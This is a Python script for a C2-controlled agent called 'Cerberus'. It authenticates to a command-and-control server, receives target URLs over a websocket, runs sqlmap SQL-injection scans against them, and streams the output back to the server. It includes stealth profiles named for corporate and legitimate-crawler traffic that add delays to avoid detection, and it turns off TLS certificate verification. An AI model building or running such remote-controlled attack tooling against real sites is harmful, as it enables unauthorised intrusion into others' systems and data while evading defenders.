#!/usr/bin/env python3
import asyncio
import websockets
import json
import subprocess
import sys
import os
import ssl
import httpx
from datetime import datetime

# Configuración por defecto (Sobrescribir con Variables de Entorno)
C2_HOST = os.environ.get("C2_HOST", "localhost:8001")
CLIENT_ID = os.environ.get("AGENT_CLIENT_ID", "")
CLIENT_SECRET = os.environ.get("AGENT_CLIENT_SECRET", "")
USE_SSL = os.environ.get("USE_SSL", "true").lower() == "true"

TARGET_ENGINE = "cerberus_engine/sqlmap.py"

async def get_agent_token():
    """Autenticarse con el C2 y obtener un JWT"""
    protocol = "https" if USE_SSL else "http"
    login_url = f"{protocol}://{C2_HOST}/auth/agent/login"
    
    print(f"[*] Autenticando Agente en {login_url}...")
    
    async with httpx.AsyncClient(verify=False) as client:
        try:
            resp = await client.post(login_url, json={
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET
            })
            if resp.status_code == 200:
                data = resp.json()
                return data.get("access_token")
            else:
                print(f"[!] Error de login ({resp.status_code}): {resp.text}")
                return None
        except Exception as e:
            print(f"[!] Error de conexión: {e}")
            return None

async def run_agent():
    if not CLIENT_ID or not CLIENT_SECRET:
        print("[!] ERROR: Se requieren AGENT_CLIENT_ID y AGENT_CLIENT_SECRET")
        sys.exit(1)

    token = await get_agent_token()
    if not token:
        print("[!] No se pudo obtener el token de acceso. Abortando.")
        sys.exit(1)

    protocol = "wss" if USE_SSL else "ws"
    ws_url = f"{protocol}://{C2_HOST}/ws/agent"
    
    # Contexto SSL para certificados auto-firmados (desarrollo)
    ssl_context = None
    if USE_SSL:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

    print(f"[*] Conectando Agente Cerberus a {ws_url}...")
    
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        async with websockets.connect(ws_url, extra_headers=headers, ssl=ssl_context) as websocket:
            print("[+] Conectado y Autenticado al C2 Channel.")
            
            async for message in websocket:
                try:
                    data = json.loads(message)
                except Exception:
                    continue

                if data.get('type') == 'command' and data.get('cmd') == 'stop':
                     print("[🛑] Comando STOP recibido. Abortando tareas...")
                     # Implementar lógica de terminación de proceso si hay uno activo
                     continue

                if data.get('action') == 'start':
                    config = data.get('config', {})
                    sql_config = config.get('sqlMap', {})
                    task_id = data.get('taskId', 'unknown')

                    cmd = [
                        sys.executable, TARGET_ENGINE,
                        "-u", config.get('url', ''),
                        "--batch"
                    ]
                    
                    # Adaptive Delay based on Profile
                    profile = config.get('profile')
                    delay = 0
                    if profile == 'Corporativo-Sigiloso':
                        delay = 3
                    elif profile == 'Móvil-5G':
                        delay = 1
                    elif profile == 'Crawler-Legítimo':
                        delay = 0.5
                        
                    if delay > 0:
                        cmd.append(f"--delay={delay}")
                    
                    # Añadir flags básicos
                    if sql_config.get('threads'): cmd.append(f"--threads={sql_config['threads']}")
                    if sql_config.get('level'): cmd.append(f"--level={sql_config['level']}")
                    if sql_config.get('risk'): cmd.append(f"--risk={sql_config['risk']}")
                    
                    print(f"[*] Ejecutando Tarea {task_id}: {' '.join(cmd)}")

                    process = subprocess.Popen(
                        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        universal_newlines=True, bufsize=1
                    )

                    for line in process.stdout:
                        clean_line = line.strip()
                        if clean_line:
                            try:
                                await websocket.send(json.dumps({
                                    'type': 'result',
                                    'taskId': task_id,
                                    'data': clean_line,
                                    'timestamp': datetime.utcnow().isoformat()
                                }))
                            except Exception:
                                print(clean_line)
    except Exception as e:
        print(f"[!] Desconectado por error: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(run_agent())
    except KeyboardInterrupt:
        print("\n[!] Agente detenido.")
